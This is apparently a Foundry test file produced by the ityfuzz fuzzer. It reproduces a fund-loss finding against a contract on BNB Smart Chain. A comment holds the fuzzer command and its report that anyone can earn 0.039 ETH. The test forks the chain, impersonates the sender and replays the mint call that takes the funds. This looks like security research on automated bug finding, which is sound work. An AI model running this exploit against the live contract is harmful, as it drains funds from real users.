// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0x88503F48e437a377f1aC2892cBB3a5b09949faDd,0xc342774492b54ce5F8ac662113ED702Fc1b34972 -c bsc --onchain-block-number 22315679 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Fund Loss]: Anyone can earn 0.039 ETH by interacting with the provided contracts

================ Trace ================
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   └─[1] 0xc342774492b54ce5F8ac662113ED702Fc1b34972.mint(1153.6626 ether, 0xfd98b57d05ffff05ed5a, 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, (), (), ())


 */

contract Cbb4C is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 22315679);
    }

    function test() public {
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        bytes32[] memory arr0 = new bytes32[](0);
        bytes32[] memory arr1 = new bytes32[](0);
        uint8[] memory arr2 = new uint8[](0);
        I(0xc342774492b54ce5F8ac662113ED702Fc1b34972).mint(1153.6626 ether, "���}���Z", 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, arr0, arr1, arr2);
    }

}

interface I {
    function mint(uint256,string memory,address,bytes32[] memory,bytes32[] memory,uint8[] memory) external payable;
}
